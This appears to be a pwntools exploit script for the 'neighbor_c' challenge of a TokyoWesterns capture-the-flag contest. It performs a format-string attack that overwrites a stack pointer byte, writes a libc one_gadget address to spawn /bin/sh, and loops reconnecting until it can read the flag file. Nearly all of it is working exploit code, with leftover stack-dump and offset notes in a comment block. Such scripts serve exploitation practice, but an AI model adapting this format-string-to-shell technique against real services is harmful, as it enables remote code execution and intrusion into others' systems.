#!/usr/bin/env python
from pwn import *


context.arch = 'amd64'
#e , l = ELF( './neighbor_c-310f2ca86ab0025591c201502ccb4bc3a13b30350b106e693cf483fbdb2b76b1' ) , ELF( './libc-a3c98364f3a1be8fce14f93323f60f3093bdc20ba525b30c32e71d26b59cd9d4.so.6' )

host , port = 'neighbor.chal.ctf.westerns.tokyo' , 37565
#y = remote( host , port )

'''
0x45526	execve("/bin/sh", rsp+0x30, environ)
0x4557a	execve("/bin/sh", rsp+0x30, environ)
0xf1651	execve("/bin/sh", rsp+0x40, environ)
0xf24cb	execve("/bin/sh", rsp+0x60, environ)

read                :
_IO_file_underflow  : 0x7f427d8d6650 -> 0x7c650     0x7ffeebdc00b8 6c8
_IO_default_uflow   : 0x7f427d8d78d2 -> 0x7d8d2     0x7ffeebdc00e8 6f8
_IO_getline_info    : 0x7f427d8c9eda -> 0x6feda     0x7ffeebdc0108 718
fgets               : 0x7f427d8c8d8b -> 0x6ed8b     0x7ffeebdc0168 778

                                                                   7a0  5.

vprintf     0x7ffc41b7a348   0x7f686e54c863 -> 0x50863
            0x7ffc41b7c498   0x7f686e549a85 -> 0x4da85
vprintf     0x7ffc41b7c9f8   0x7f686e552507 -> 0x56507
fprintf     0x7ffc41b7cad8   0x559e80c3b926


            0x7ffc41b7cae0  
                       af0:    

            390: 
            3a0: 3c0
            3b0: 3c0
            3c0: 3d0   


0x7ffc07f98a20:	0x00007fbd0ab59520	0x00007fbd0ab59520

0x7ffc07f98a30:	0x00007ffc07f98a50	0x00007fbd0ab59520 7  8
0x7ffc07f98a40:	0x00007ffc07f98a50	0x00005586d2548962 9  10
0x7ffc07f98a50:	0x00007ffc07f98a60	0x00005586d25489d7 11 12
0x7ffc07f98a60:	0x00005586d25489f0	0x00007fbd0a7b73f1 13 14
0x7ffc07f98a70:	0x0000000000040000	0x00007ffc07f98b38 15 16
0x7ffc07f98a80:	0x000000010a921508	0x00005586d2548965 17 18
0x7ffc07f98a90:	0x0000000000000000	0xdb781cba1956a0cc
0x7ffc07f98aa0:	0x00005586d25487a0	0x00007ffc07f98b30                   


'''



def fmt( p ):
    y.sendline( p )
    sleep( 2.5 )

#p = '%{:d}c%7$hhn'.format( 0x68 )
#fmt( p )

one = 0xf1651
#one = 0x4557a
#one = 0xf24cb
off = 0x203f1

#p = '%*14$c%{:d}c%11$n'.format( one - off )
#p = '%*15$c%{:d}c%11$n'.format( one - off )
#fmt( p )#

while True:
    y = remote( host , port )
    y.recvuntil( 'mayor.\n' )
    p = '%{:d}c%7$hhn'.format( 0x68 )
    fmt( p )
    p = '%*14$c%{:d}c%11$n'.format( one - off )
    fmt( p )
    try:
        while True:
            sleep( 10 )
            y.sendline( 'cat /home/`whoami`/flag' )
            sleep( 1 )
            y.sendline( 'echo yuawn' )
            try:
                #o = y.recvuntil( 'yuawn' , timeout=1 )
                o = y.recvuntil( 'yuawn' , timeout = 2 )
                print 'out -> %s' % o
                if 'yuawn' in o:
                    y.interactive()
                #print 
            except:
                continue
    except:
        y.close()


y.interactive()